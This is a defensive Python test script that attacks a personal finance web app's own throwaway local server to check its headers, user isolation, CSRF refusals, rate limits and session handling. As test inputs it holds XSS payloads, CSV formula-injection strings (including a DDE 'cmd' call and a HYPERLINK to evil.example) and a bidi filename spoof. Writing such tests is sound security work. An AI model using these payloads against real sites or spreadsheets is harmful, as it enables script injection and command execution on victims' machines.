"""Attack checks for scripts/attack.sh. Run only against the throwaway server it starts.

API part with urllib (standard library), import and browser parts with Playwright in headless Chrome. The import
part builds its files here (a CSV, a PDF, the same PDF locked with RC4, files over the size limits): no fixture files.
Prints PASS/FAIL per check. Never prints a passphrase, a cookie or a session token.
"""

import calendar
import csv
import hashlib
import io
import json
import re
import struct
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

BASE = sys.argv[1].rstrip("/")
STATE = Path(sys.argv[2])
if not BASE.startswith("http://127.0.0.1:") or BASE.endswith((":8788", ":8790")):
    sys.exit("attack.py runs only against the throwaway server on 127.0.0.1 (not 8788 or 8790)")

MARK = "ALICEMARK"  # every payload of alice carries it, so bob's screens can be searched for it
XSS = [
    f'<img src=x onerror="window.__xss=1;alert(1)">{MARK}',
    f"<script>window.__xss=2;alert(2)</script>{MARK}",
    f'<svg onload="window.__xss=3">{MARK}',
    f'" onmouseover="window.__xss=4" x="{MARK}',
    f"javascript:alert(5)//{MARK}",
    f"$& $' $` {MARK}",
]
FORMULAS = ['=HYPERLINK("http://evil.example","x")', "+1+1", "-2+3", "@SUM(A1)", "\t=1+1", "=cmd|' /C calc'!A0"]
# The app's modules as they are on disk (not as sw.js lists them): the cache must hold every one of them (so the
# Home Screen app gets new modules) and nothing outside these and the fixed shell files.
PUBLIC = Path(__file__).resolve().parent.parent / "public"
MODULES = {"/" + p.relative_to(PUBLIC).as_posix() for p in (PUBLIC / "js").rglob("*.js")}
SHELL = {"/", "/app.css", "/app.js", "/theme.js", "/boot-check.js", "/manifest.webmanifest", "/icons/icon-192.png", "/icons/icon.svg", "/icons.svg"} | MODULES

# pdf.js as vetted (scripts/vendor-pdfjs.sh, scripts/git-privacy-check.sh pin the same hashes).
VENDORED = {
    "/vendor/pdfjs-6.5.438/pdf.min.mjs": "3a88402882cfa3e7e72c2c9b5149f52f0f88baf1c5b62aa11a41abdbc2072440",
    "/vendor/pdfjs-6.5.438/pdf.worker.min.mjs": "1e64c8240e54735ec5913b37acd5134747799cb8c6bb3777c70adbc01232d2aa",
}

results = []
TODAY = ""  # the server's today (El Salvador), from alice's bootstrap


def check(name, ok, detail=""):
    results.append((name, bool(ok)))
    print(("PASS " if ok else "FAIL ") + name + ("" if ok or not detail else f": {detail}"))


def info(msg):
    print("INFO " + msg)


class Res:
    def __init__(self, status, headers, body):
        self.status, self.headers, self.body = status, headers, body

    def json(self):
        try:
            return json.loads(self.body or b"null")
        except ValueError:
            return None

    def header(self, name):
        return self.headers.get(name)

    def cookies(self):
        return self.headers.get_all("Set-Cookie") or []


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def req(method, path, body=None, cookie=None, headers=None, raw=None):
    h = {"Accept": "application/json"}
    data = None
    if raw is not None:
        data = raw
    elif body is not None:
        data = json.dumps(body).encode()
    if method not in ("GET", "HEAD"):
        h["Content-Type"] = "application/json"
    if cookie:
        h["Cookie"] = cookie
    h.update(headers or {})
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with OPENER.open(r, timeout=30) as resp:
            return Res(resp.status, resp.headers, resp.read())
    except urllib.error.HTTPError as e:
        return Res(e.code, e.headers, e.read())


def creds(user):
    lines = dict(
        line.split(": ", 1) for line in (STATE / f"{user}-login.txt").read_text().splitlines() if ": " in line
    )
    return lines["user"], lines["passphrase"]


def login(user, ip=None, passphrase=None):
    name, pw = creds(user)
    h = {"CF-Connecting-IP": ip} if ip else {}
    r = req("POST", "/api/login", {"username": name, "passphrase": passphrase or pw}, headers=h)
    cookie = ""
    for c in r.cookies():
        if c.startswith("fz_s=") and not c.startswith("fz_s=;"):
            cookie = c.split(";", 1)[0]
    return r, cookie


def boot(cookie):
    return req("GET", "/api/bootstrap", cookie=cookie)


# ---------------------------------------------------------------- API part

def api_part():
    print("== API")
    page = req("GET", "/")
    csp = page.header("Content-Security-Policy") or ""
    check("static page: CSP allows only own scripts", "script-src 'self'" in csp and "unsafe" not in csp)
    for k, v in [
        ("Cross-Origin-Opener-Policy", "same-origin"), ("Cross-Origin-Embedder-Policy", "require-corp"),
        ("Cross-Origin-Resource-Policy", "same-origin"), ("X-Frame-Options", "DENY"), ("X-Content-Type-Options", "nosniff"),
        ("Strict-Transport-Security", "max-age=31536000; includeSubDomains"), ("Referrer-Policy", "no-referrer"),
    ]:
        check(f"static page header {k}", page.header(k) == v, str(page.header(k)))

    # pdf.js and the import readers: served as JavaScript under nosniff, with COEP (the readers run in workers), and
    # byte for byte the vetted build. The type files for the tests are not served.
    for path, sha in VENDORED.items():
        r = req("GET", path)
        ctype = (r.header("Content-Type") or "").split(";")[0]
        check(f"{path.rsplit('/', 1)[1]}: the vetted build, served as JavaScript with nosniff, COEP and CORP",
              r.status == 200 and hashlib.sha256(r.body).hexdigest() == sha and ctype == "text/javascript"
              and r.header("X-Content-Type-Options") == "nosniff" and r.header("Cross-Origin-Embedder-Policy") == "require-corp"
              and r.header("Cross-Origin-Resource-Policy") == "same-origin",
              f"{r.status} {ctype} sha256 {hashlib.sha256(r.body).hexdigest()[:12]}")
    for path in ["/import/pdf-worker.js", "/import/csv-worker.js", "/import/read.js"]:
        r = req("GET", path)
        check(f"{path}: JavaScript with nosniff, COEP and the CSP", r.status == 200
              and (r.header("Content-Type") or "").startswith("text/javascript") and r.header("X-Content-Type-Options") == "nosniff"
              and r.header("Cross-Origin-Embedder-Policy") == "require-corp" and r.header("Content-Security-Policy") == csp)
    dts = [path for path in ["/import/csv.d.ts", "/import/parse.d.ts", "/import/upload.d.ts"] if req("GET", path).status != 404]
    check("the import type files (.d.ts) are not served", not dts, ", ".join(dts))

    r, a_cookie = login("alice")
    check("alice signs in", r.status == 200 and a_cookie)
    sc = next((c for c in r.cookies() if c.startswith("fz_s=")), "")
    check("local cookie is HttpOnly, SameSite=Strict, Path=/", all(x in sc for x in ["HttpOnly", "SameSite=Strict", "Path=/"]) and "Domain" not in sc)
    r, b_cookie = login("bob")
    check("bob signs in", r.status == 200 and b_cookie)

    for what, res in [("401", boot("")), ("404", req("GET", "/api/nothing", cookie=a_cookie)), ("200", boot(a_cookie)),
                      ("403", req("POST", "/api/logout", {}, a_cookie, {"Origin": "https://evil.example"}))]:
        ok = all(res.header(k) for k in ["Content-Security-Policy", "Strict-Transport-Security", "Cross-Origin-Resource-Policy", "X-Frame-Options"])
        check(f"API {what} has the security headers", ok and res.header("Cache-Control") == "no-store")

    # Payloads saved by alice.
    global TODAY
    a_boot = boot(a_cookie).json()
    TODAY = a_boot["today"]
    acc = req("POST", "/api/accounts", {"name": f"<img src=x onerror=alert(1)>{MARK}"}, a_cookie)
    grp = req("POST", "/api/groups", {"name": f"<script>alert(1)</script>{MARK}"}, a_cookie)
    check("payload account and group saved", acc.status == 201 and grp.status == 201, f"{acc.status} {grp.status}")
    cat = req("POST", "/api/categories", {"group_id": grp.json()["id"], "name": f'"><svg onload=alert(1)>{MARK}', "kind": "G"}, a_cookie)
    # A limit on this category gives the payload group a limit, so Home draws it as an over-limit row with a bar.
    cat2 = req("POST", "/api/categories", {"group_id": grp.json()["id"], "name": f"=1+1 {MARK}", "kind": "E", "limit_cents": 1000}, a_cookie)
    check("payload categories saved", cat.status == 201 and cat2.status == 201, f"{cat.status} {cat2.status}")
    # A group with a limit and no spending lands in Home's folded "N grupos sin gasto" row.
    fold = req("POST", "/api/groups", {"name": f'<img src=x onerror="window.__xss=21">{MARK}-fold', "limit_cents": 5000}, a_cookie)
    check("payload group with no spending saved", fold.status == 201, str(fold.status))
    acc_id, cat_id = acc.json()["id"], cat.json()["id"]
    ids = []
    for i, p in enumerate(XSS + FORMULAS):
        body = {
            "client_id": f"attack-{i:04d}-x", "amount_cents": 100 + i, "account_id": acc_id, "comercio": p,
            "nota": f"{p} nota", "tags": [p[:40], f"=2+2{MARK}"[:40], "<b>t</b>"],
        }
        if i % 2 == 0:
            body["category_id"] = cat_id  # half sorted, half left for Revisar
        res = req("POST", "/api/movements", body, a_cookie)
        if res.status == 201:
            ids.append(res.json()["movement"]["id"])
            m = res.json()["movement"]
            if m["comercio"] != p.strip():
                check(f"payload {i} stored as typed", False, "changed")
        else:
            check(f"payload {i} saved", False, str(res.status))
    check(f"{len(XSS) + len(FORMULAS)} payload movements saved", len(ids) == len(XSS) + len(FORMULAS))
    # A second charge at the same shops, so the payload names also reach "Cargos que se repiten" in Análisis.
    again = [req("POST", "/api/movements", {"client_id": f"attack-again-{i:02d}", "amount_cents": 300 + i, "account_id": acc_id,
                                            "comercio": p, "category_id": cat_id}, a_cookie).status for i, p in enumerate(XSS)]
    check("repeat payload movements saved", all(s == 201 for s in again), str(again))
    bidi = req("POST", "/api/movements", {"client_id": "attack-bidi-01", "amount_cents": 5, "account_id": acc_id,
                                          "comercio": "INVOICE‮gnp.exe⁦" + MARK}, a_cookie)
    check("direction characters removed", bidi.status == 201 and bidi.json()["movement"]["comercio"] == "INVOICEgnp.exe" + MARK)

    # Spreadsheet formulas cannot run from the export.
    csv_res = req("GET", "/api/export.csv", cookie=a_cookie)
    text = csv_res.body.decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(text)))
    bad = [c for row in rows for c in row if c[:1] in ("=", "+", "-", "@", "\t", "\r")]
    check("CSV export: no cell starts with = + - @ tab or CR", csv_res.status == 200 and not bad, f"{len(bad)} cells")
    check("CSV export: payload text present as plain text", "<script>" in text and MARK in text)
    check("CSV export is no-store and an attachment", csv_res.header("Cache-Control") == "no-store"
          and "attachment" in (csv_res.header("Content-Disposition") or ""))

    # Cross-user: bob uses alice's ids.
    before = req("GET", "/api/export.csv", cookie=a_cookie).body
    mid = ids[0]
    b_boot = boot(b_cookie).json()
    b_acc = b_boot["accounts"][0]["id"]
    b_mov = req("POST", "/api/movements", {"client_id": "bob-own-0001", "amount_cents": 1, "account_id": b_acc}, b_cookie).json()["movement"]["id"]
    tries = [
        ("GET", f"/api/movements/{mid}", None), ("PUT", f"/api/movements/{mid}", {"nota": "bob"}),
        ("DELETE", f"/api/movements/{mid}", {}), ("POST", f"/api/movements/{mid}/merge", {"bank_id": b_mov}),
        ("POST", f"/api/movements/{b_mov}/merge", {"bank_id": mid}),
        ("POST", f"/api/review/{ids[1]}/categorize", {"category_id": cat_id}),
        ("POST", f"/api/review/{b_mov}/categorize", {"category_id": cat_id}),
        ("PUT", f"/api/accounts/{acc_id}", {"name": "bob"}), ("PUT", f"/api/categories/{cat_id}", {"name": "bob"}),
        ("PUT", f"/api/groups/{grp.json()['id']}", {"name": "bob"}),
        ("POST", "/api/categories", {"group_id": grp.json()["id"], "name": "bob", "kind": "G"}),
        ("POST", "/api/movements", {"client_id": "bob-steal-01", "amount_cents": 1, "account_id": acc_id}),
        ("POST", "/api/movements", {"client_id": "bob-steal-02", "amount_cents": 1, "account_id": b_acc, "category_id": cat_id}),
        ("PUT", f"/api/movements/{b_mov}", {"account_id": acc_id}), ("PUT", f"/api/movements/{b_mov}", {"category_id": cat_id}),
        ("GET", "/api/users", None), ("POST", f"/api/users/{a_boot['user']['id']}/logout-all", {}),
    ]
    refused = [(m, p, req(m, p, b, b_cookie).status) for m, p, b in tries]
    check(f"bob is refused on all {len(tries)} cross-user tries", all(s in (400, 403, 404) for _, _, s in refused),
          ", ".join(f"{m} {p} {s}" for m, p, s in refused if s not in (400, 403, 404)))
    leaks = [p for p in ["/api/bootstrap", "/api/movements?limit=300", "/api/review", "/api/export.csv",
                         f"/api/movements?account_id={acc_id}", f"/api/movements?category_id={cat_id}",
                         f"/api/suggest?comercio={MARK}"]
             if MARK.encode() in req("GET", p, cookie=b_cookie).body]
    check("bob sees nothing of alice's", not leaks, ", ".join(leaks))
    check("alice's data unchanged after bob's tries", req("GET", "/api/export.csv", cookie=a_cookie).body == before)

    # Requests from another site.
    mk = lambda cid: {"client_id": cid, "amount_cents": 1, "account_id": acc_id}  # noqa: E731
    xs = [
        req("POST", "/api/movements", mk("xsite-0001"), a_cookie, {"Origin": "https://evil.example"}),
        req("POST", "/api/movements", mk("xsite-0002"), a_cookie, {"Sec-Fetch-Site": "cross-site"}),
        req("POST", "/api/movements", mk("xsite-0003"), a_cookie, {"Sec-Fetch-Site": "same-site"}),
        req("POST", "/api/movements", mk("xsite-0004"), a_cookie, {"Content-Type": "text/plain"}),
        req("POST", "/api/movements", None, a_cookie, {"Content-Type": "application/x-www-form-urlencoded"},
            raw=b"client_id=xsite-0005&amount_cents=1"),
        req("GET", "/api/export.csv", cookie=a_cookie, headers={"Sec-Fetch-Site": "cross-site"}),
        req("POST", "/api/logout", {}, a_cookie, {"Sec-Fetch-Site": "cross-site"}),
    ]
    check("cross-site requests refused", [r.status for r in xs] == [403, 403, 403, 415, 415, 403, 403], str([r.status for r in xs]))
    check("nothing saved by cross-site tries", b"xsite-" not in req("GET", "/api/export.csv", cookie=a_cookie).body
          and boot(a_cookie).status == 200)

    # Limits.
    big = req("POST", "/api/movements", None, a_cookie, raw=json.dumps({**mk("big-00001"), "nota": "a" * 70000}).encode())
    check("70 KB body refused (413)", big.status == 413, str(big.status))
    old = req("POST", "/api/movements", {**mk("old-000001"), "fecha": "1999-12-31"}, a_cookie)
    fut = req("POST", "/api/movements", {**mk("fut-000001"), "fecha": "2099-01-01"}, a_cookie)
    check("dates before 2000 or after tomorrow refused", old.status == 400 and fut.status == 400)
    check("huge offset answered fast and empty", req("GET", "/api/movements?offset=1e18", cookie=a_cookie).json()["items"] == [])
    return a_cookie, b_cookie, acc_id


def login_abuse_part():
    print("== login abuse (after the browser part, so it cannot block the browser sign-in)")
    probe_ip = "203.0.113.77"
    for _ in range(5):
        login("alice", ip=probe_ip, passphrase="wrong-wrong-wrong")
    locked, _ = login("alice", ip=probe_ip)
    check("5 wrong tries lock that username from that IP, even with the right passphrase", locked.status == 429)
    other, cookie = login("alice", ip="203.0.113.78")
    if other.status == 200:
        check("the same user still signs in from another IP (no lockout of the owner)", True)
    else:
        info(f"local server did not pass CF-Connecting-IP through (status {other.status}); covered by test/security.test.ts")

    # Parallel burst from one IP: at most 10 reach the check.
    from concurrent.futures import ThreadPoolExecutor
    ip = "203.0.113.90"
    name, _ = creds("bob")
    with ThreadPoolExecutor(max_workers=20) as ex:
        statuses = list(ex.map(lambda _: req("POST", "/api/login", {"username": name, "passphrase": "wrong"},
                                             headers={"CF-Connecting-IP": ip}).status, range(30)))
    n401 = statuses.count(401)
    check("30 parallel wrong tries: at most 4 wrong answers, the rest refused", n401 <= 4 and statuses.count(429) == 30 - n401,
          f"401 x{n401}, 429 x{statuses.count(429)}, other {[s for s in statuses if s not in (401, 429)]}")

    # Sign out everywhere and the owner tools.
    _, a1 = login("alice", ip="203.0.113.81")
    _, a2 = login("alice", ip="203.0.113.82")
    _, b1 = login("bob", ip="203.0.113.83")
    users = req("GET", "/api/users", cookie=a1)
    check("owner lists users", users.status == 200 and len(users.json()["users"]) == 2)
    bob_id = next(u["id"] for u in users.json()["users"] if u["username"] == "bob")
    req("POST", f"/api/users/{bob_id}/logout-all", {}, a1)
    check("owner ends bob's sessions", boot(b1).status == 401 and boot(a1).status == 200)
    req("POST", "/api/logout-all", {}, a1)
    check("sign out everywhere ends both of alice's sessions", boot(a1).status == 401 and boot(a2).status == 401)


# ---------------------------------------------------------------- browser part

def screens():
    """Every screen, including the Análisis periods and Movimientos opened at a day (as a day bar does)."""
    return ["#/", "#/movimientos", f"#/movimientos?month={TODAY[:7]}&tipo=gastos&day={TODAY}", "#/agregar", "#/mas",
            "#/revisar", "#/ajustes", "#/analisis", "#/analisis?p=semana", "#/analisis?p=anio",
            "#/importar", "#/pasos/ahorro", "#/pasos/limites"]


SHEETS = {"#/movimientos": ['[data-act="editMov"]'], "#/ajustes": ['[data-act="editGroup"]', '[data-act="editAcc"]', '[data-act="editCat"]'],
          "#/revisar": ['[data-act="rvOther"]']}
# Parts of a screen that open in place: Home's folded "N grupos sin gasto" row first, then each group's panel.
OPENERS = {"#/": ['[data-act="fold"]', 'summary[data-act="grp"]']}
# Chart parts and bars: focusing each one fills the tooltip, which carries group names and day labels.
CHART_TARGETS = ".fzc-part, .fzc-hit[role='button'], svg.fzc-svg[tabindex]"
INJECTED = 'img[src="x"], [onerror], [onload], [onmouseover], svg[onload], #app script, #sheet script, a[href^="javascript:"]'
# Hostile values in the address bar: every hash parameter the screens read.
HOSTILE = [
    "#/movimientos?" + "&".join([
        'q=<img src=x onerror="window.__xss=11">', 'month=<svg onload="window.__xss=12">',
        'cat=g:"><img src=x onerror="window.__xss=13">', 'acc="><script>window.__xss=14</script>', "tipo=<b>x</b>",
        "estado=<i>x</i>", 'day="]<img src=x onerror="window.__xss=15">',
    ]),
    '#/movimientos?day=2026-13-45&month=1999-01',
    '#/analisis?p=<script>window.__xss=16</script>&at=<img src=x onerror="window.__xss=17">',
    "#/analisis?p=semana&at=2026-00-00", "#/analisis?p=semana&at=2026-02-31", "#/analisis?p=mes&at=2026-13",
    "#/analisis?p=anio&at=0001", "#/analisis?p=semana&at=9999-12-31",
    "#constructor", "#__proto__", "#toString",  # names every plain object has: they must fall back to Home
]

INIT = """
window.__csp = [];
document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective));
// Every value Home's and Análisis's big numbers show, count-up frames included. While __watch is set, __mark
// counts the DOM changes after which alice's mark is anywhere in the page (text or attributes).
window.__heroLog = [];
window.__anLog = [];
window.__mark = 0;
new MutationObserver(() => {
  const h = document.getElementById('heroNum');
  if (h && window.__heroLog[window.__heroLog.length - 1] !== h.textContent) window.__heroLog.push(h.textContent);
  const a = document.getElementById('anHero');
  if (a && window.__anLog[window.__anLog.length - 1] !== a.textContent) window.__anLog.push(a.textContent);
  if (window.__watch && document.documentElement.outerHTML.includes('MARK_PLACEHOLDER')) window.__mark += 1;
}).observe(document, { subtree: true, childList: true, characterData: true, attributes: true });
""".replace("MARK_PLACEHOLDER", MARK)


def browser_part():
    from playwright.sync_api import sync_playwright

    print("== browser (headless Chrome)")
    with sync_playwright() as p:
        browser = p.chromium.launch(channel="chrome", headless=True)
        for user in ["alice", "bob"]:
            ctx = browser.new_context(viewport={"width": 390, "height": 844})
            ctx.add_init_script(INIT)
            page = ctx.new_page()
            dialogs, errors = [], []
            page.on("dialog", lambda d: (dialogs.append(d.type), d.dismiss()))
            page.on("pageerror", lambda e: errors.append(str(e)[:120]))
            page.goto(BASE + "/", wait_until="networkidle")
            name, pw = creds(user)
            page.fill('input[name="username"]', name)
            page.fill('input[name="password"]', pw)
            page.click('form[data-submit="login"] button')
            page.wait_for_selector("#tabs:not([hidden])", timeout=15000)
            check(f"{user}: page is cross-origin isolated (COOP and COEP work)", page.evaluate("self.crossOriginIsolated") is True)
            page.evaluate("navigator.serviceWorker.ready.then(() => true)")
            page.reload(wait_until="networkidle")
            page.wait_for_selector("#tabs:not([hidden])", timeout=15000)
            seen_text = ""
            tip_text = ""
            home_text = ""
            injected_on = []
            for hash_ in screens():
                page.evaluate(f"location.hash = {json.dumps(hash_)}")
                page.wait_for_load_state("networkidle")
                page.wait_for_timeout(300)
                seen_text += page.inner_text("body")
                for el in page.query_selector_all(CHART_TARGETS)[:40]:
                    try:
                        el.focus()
                        tip_text += " ".join(page.eval_on_selector_all(".fzc-tip:not([hidden])", "els => els.map((e) => e.textContent)"))
                        if page.eval_on_selector_all(INJECTED, "els => els.length"):  # each tooltip is replaced by the next
                            injected_on.append(f"{hash_} tooltip")
                    except Exception as e:  # a chart redrawn while we look is fine
                        info(f"{user} {hash_}: chart part not focusable ({type(e).__name__})")
                for sel in SHEETS.get(hash_, []):
                    els = page.query_selector_all(sel)
                    for el in els[:3]:
                        try:
                            el.click(timeout=3000)
                            page.wait_for_timeout(300)
                            seen_text += page.inner_text("#sheet") if page.query_selector("#sheet[open]") else ""
                            page.keyboard.press("Escape")
                            page.wait_for_timeout(150)
                        except Exception as e:  # a hidden row is fine; a payload running is not
                            info(f"{user} {hash_} {sel}: could not open ({type(e).__name__})")
                for sel in OPENERS.get(hash_, []):
                    for el in page.query_selector_all(sel)[:8]:
                        try:
                            el.click(timeout=3000)
                            page.wait_for_timeout(120)
                        except Exception as e:
                            info(f"{user} {hash_} {sel}: could not open ({type(e).__name__})")
                if hash_ in OPENERS:
                    page.wait_for_timeout(400)
                    opened = page.inner_text("#app")
                    seen_text += opened
                    if hash_ == "#/":
                        home_text = opened
                injected = page.eval_on_selector_all(INJECTED, "els => els.length")
                if injected:
                    injected_on.append(f"{hash_} ({injected})")
            check(f"{user}: no payload became HTML on {len(screens())} screens, their sheets and chart tooltips", not injected_on,
                  ", ".join(dict.fromkeys(injected_on)))
            hostile_bad = []
            for hash_ in HOSTILE:
                page.evaluate(f"location.hash = {json.dumps(hash_)}")
                page.wait_for_load_state("networkidle")
                page.wait_for_timeout(300)
                if page.eval_on_selector_all(INJECTED, "els => els.length"):
                    hostile_bad.append(f"{hash_[:40]}: injected")
                if hash_.startswith("#/analisis") and not page.query_selector('[data-screen="analisis"]'):
                    hostile_bad.append(f"{hash_[:40]}: no normal screen")
                if not hash_.startswith("#/") and not page.query_selector("#heroNum"):
                    hostile_bad.append(f"{hash_}: not Home")
            check(f"{user}: {len(HOSTILE)} hostile address-bar values: no HTML, Análisis falls back to a normal period, "
                  "object names fall back to Home",
                  not hostile_bad, "; ".join(hostile_bad))
            state = page.evaluate("({xss: window.__xss ?? null, csp: window.__csp})")
            check(f"{user}: no payload ran on any screen or sheet", state["xss"] is None and not dialogs,
                  f"xss={state['xss']} dialogs={dialogs}")
            check(f"{user}: no script or inline handler was even tried (no CSP reports)", not state["csp"], str(state["csp"][:5]))
            check(f"{user}: no page errors", not errors, "; ".join(errors[:3]))
            if user == "alice":
                check("alice: payloads show as plain text", "<script>" in seen_text and "onerror" in seen_text and MARK in seen_text)
                check("alice: chart tooltips show the payload group name as plain text", "<script>" in tip_text and MARK in tip_text)
                check("alice: greeting keeps $& and $' exactly (t() fix)", "$& $'" in seen_text)
                check("alice: Home's open groups and folded no-spending row show payload names as plain text",
                      f"{MARK}-fold" in home_text and "window.__xss=21" in home_text and "<script>" in home_text and "<svg onload" in home_text)
                # Try to get non-shell files and API data into the service worker cache.
                page.evaluate("""async () => {
                  await navigator.serviceWorker.ready;
                  for (const u of ['/api/export.csv', '/api/bootstrap', '/icons/icon-512.png', '/?x=1', '/index.html', '/manifest.webmanifest?v=2',
                                   '/import/read.js', '/import/import.css', '/vendor/pdfjs-6.5.438/pdf.min.mjs', '/api/imports', '/api/pasos'])
                    await fetch(u).catch(() => {});
                }""")
                page.wait_for_timeout(800)
                cached = page.evaluate("""async () => {
                  const out = [];
                  for (const k of await caches.keys()) { const c = await caches.open(k);
                    for (const r of await c.keys()) { const u = new URL(r.url); out.push(u.pathname + u.search); } }
                  return out; }""")
                extra = sorted(set(cached) - SHELL)
                check("service worker cache holds only the app shell", cached and not extra, ", ".join(extra))
                missing = sorted(MODULES - set(cached))
                check(f"service worker caches all {len(MODULES)} modules on disk (sw.js MODULES complete)", not missing, ", ".join(missing))
                # alice's session ends while the app is open (as "sign out everywhere" on another device does), with
                # the screen memory warm (Home, Movimientos and Análisis seen), and bob signs in on the same page:
                # nothing of alice's may show in any frame of bob's screens, not from memory, not from a count-up
                # that starts at her last number.
                page.evaluate("location.hash = '#/analisis'")
                page.wait_for_selector("#anHero")
                page.wait_for_timeout(700)
                alice_an = page.text_content("#anHero")
                page.evaluate("location.hash = '#/movimientos'")
                page.wait_for_selector("#movList .row")
                page.evaluate("location.hash = '#/'")
                page.wait_for_selector("#heroNum")
                page.wait_for_timeout(700)
                alice_hero = page.text_content("#heroNum")
                kept = page.evaluate("import('/js/state.js').then((m) => [...m.memo.map.keys()].map((k) => k.split(':')[0]))")
                check("alice: the screen memory holds Home, Movimientos and Análisis before her session ends",
                      {"summary", "spend", "movs"} <= set(kept), str(sorted(set(kept))))
                page.evaluate("window.__samePage = 1")
                session = next((f"{c['name']}={c['value']}" for c in ctx.cookies() if c["name"] == "fz_s"), "")
                ended = req("POST", "/api/logout", {}, session).status if session else 0
                page.wait_for_timeout(5200)  # past the memory's 5 s fresh window, so the next screen loads again
                # a tap on a tab whose screen is in memory: it shows at once, and its quiet refresh gets the 401
                page.click('#tabs a[href="#/movimientos"]')
                try:  # with the fix the page reloads; wait for the fresh login form
                    page.wait_for_function("() => window.__samePage === undefined && document.querySelector('form[data-submit=\"login\"]')", timeout=5000)
                except Exception:
                    page.wait_for_selector('form[data-submit="login"]', timeout=10000)
                page.wait_for_load_state("networkidle")
                reloaded = page.evaluate("window.__samePage === undefined")
                page.evaluate("window.__heroLog = []; window.__anLog = []; window.__mark = 0; window.__watch = 1")
                bname, bpw = creds("bob")
                page.fill('input[name="username"]', bname)
                page.fill('input[name="password"]', bpw)
                page.click('form[data-submit="login"] button')
                page.wait_for_selector("#tabs:not([hidden])", timeout=15000)
                page.wait_for_selector("#heroNum")
                page.wait_for_timeout(700)
                bob_hero = page.text_content("#heroNum")
                for tab, sel in [("#/movimientos", "#movList"), ("#/analisis", "#anHero"), ("#/", "#heroNum")]:
                    page.click(f'#tabs a[href="{tab}"]')
                    page.wait_for_selector(sel)
                    page.wait_for_timeout(700)
                log, an_log, marks = page.evaluate("[window.__heroLog, window.__anLog, window.__mark]")
                bob_text = page.inner_text("body")
                check("a session that ends while open reloads the page; bob signing in next sees nothing of alice's "
                      "in any frame of Home, Movimientos or Análisis (memory warm)",
                      ended == 200 and reloaded and alice_hero != bob_hero and alice_hero not in log and alice_an not in an_log
                      and marks == 0 and MARK not in bob_text,
                      f"ended={ended} reloaded={reloaded} alice's Home number in bob's frames={alice_hero in log} "
                      f"alice's Análisis number={alice_an in an_log} frames with alice's mark={marks}")
                page.evaluate("window.__watch = 0")
                # Logout reloads the page and leaves no session cookie (bob's, now).
                page.evaluate("location.hash = '#/ajustes'")
                page.wait_for_selector('[data-act="logout"]')
                with page.expect_navigation(wait_until="load", timeout=10000):
                    page.click('[data-act="logout"]')
                page.wait_for_selector('form[data-submit="login"]', timeout=10000)
                left = [c["name"] for c in ctx.cookies() if "fz_s" in c["name"]]
                check("logout reloads the page and drops the session cookie", not left, str(left))
            else:
                check("bob: none of alice's data on bob's screens", MARK not in seen_text)
            ctx.close()
        late_answer_part(browser)
        save_race_part(browser)
        other_tab_part(browser)
        wave4_part(browser)
        browser.close()


# ---------------------------------------------------------------- timing part (requests held in the browser)

class Hold:
    """Holds the first `limit` matching requests in the browser until release(); later ones pass.
    answered=True: the server answers at once (as it would have then) and the page gets that answer on release.
    answered=False: the request reaches the server only on release."""

    def __init__(self, page, match, answered, method=None, limit=1):
        self.page, self.match, self.answered, self.method, self.limit = page, match, answered, method, limit
        self.held = []
        page.route(self.match, self.handle)

    def handle(self, route):
        if len(self.held) >= self.limit or (self.method and route.request.method != self.method):
            route.continue_()
            return
        if self.answered:
            self.held.append((route, route.fetch()))
        else:
            self.held.append((route, None))

    def wait(self, n=1, ms=8000):
        for _ in range(ms // 50):
            if len(self.held) >= n:
                return True
            self.page.wait_for_timeout(50)
        return False

    def release(self):
        for route, res in self.held:
            try:
                route.fulfill(response=res) if res is not None else route.continue_()
            except Exception:  # a navigation the page itself replaced meanwhile
                pass
        self.page.unroute(self.match, self.handle)


def timing_context(browser, ip):
    """A context of its own (own IP bucket for the sign-in limit, no service worker so every request is seen)."""
    ctx = browser.new_context(viewport={"width": 390, "height": 844}, service_workers="block",
                              extra_http_headers={"CF-Connecting-IP": ip})
    ctx.add_init_script(INIT)
    page = ctx.new_page()
    errors = []
    page.on("pageerror", lambda e: errors.append(str(e)[:120]))
    page.on("dialog", lambda d: d.dismiss())
    return ctx, page, errors


def sign_in(page, user):
    name, pw = creds(user)
    page.fill('input[name="username"]', name)
    page.fill('input[name="password"]', pw)
    page.click('form[data-submit="login"] button')


# Keeps a page open when it asks to reload (as a slow connection would): while window.__stay is set, the
# beforeunload prompt comes up and the context's dialog handler dismisses it, so the page stays. __unloads counts
# the reloads asked for. (Holding the document request instead freezes every evaluate until it is let through.)
STAY = """addEventListener('beforeunload', (e) => {
  window.__unloads = (window.__unloads || 0) + 1;
  if (window.__stay) { e.preventDefault(); e.returnValue = ''; }
});"""


def money_text(cents):
    return ("−" if cents < 0 else "") + f"${abs(cents) // 100:,}.{abs(cents) % 100:02d}"


def wave4_part(browser):
    """Seguridad, Wave 4 review (Nov 25 2026): screens, start data and Movimientos paging, as bob."""
    print("== Wave 4 screens (start data, wake, Movimientos)")
    ctx, page, errors = timing_context(browser, "198.51.100.41")
    page.goto(BASE + "/", wait_until="networkidle")
    sign_in(page, "bob")
    page.wait_for_selector("#tabs:not([hidden])", timeout=15000)
    # 105 movements on one account today, so the account filter has a second page
    seed = page.evaluate("""async () => {
      const { api } = await import('/js/api.js');
      let b = await api('/bootstrap');
      while (b.accounts.filter((a) => !a.archived).length < 2) {
        await api('/accounts', { method: 'POST', body: { name: 'W4 ' + b.accounts.length, kind: 'efectivo' } });
        b = await api('/bootstrap');
      }
      const [a1, a2] = b.accounts.filter((a) => !a.archived);
      const cat = b.categories.find((c) => !c.archived && c.kind !== 'ingreso');
      for (let i = 0; i < 105; i += 15) {
        await Promise.all(Array.from({ length: Math.min(15, 105 - i) }, (_, j) => api('/movements', { method: 'POST', body: {
          client_id: 'w4-' + (i + j) + '-' + Date.now(), amount_cents: 1000 + i + j, fecha: b.today, hora: '08:00',
          tipo: 'gasto', comercio: 'W4 tienda ' + (i + j), account_id: a1.id, category_id: cat ? cat.id : null } })));
      }
      await (await import('/js/data.js')).loadBoot(); // the screens see the new account
      return { a1: a1.id, a1name: a1.name, a2: a2.id, today: b.today };
    }""")
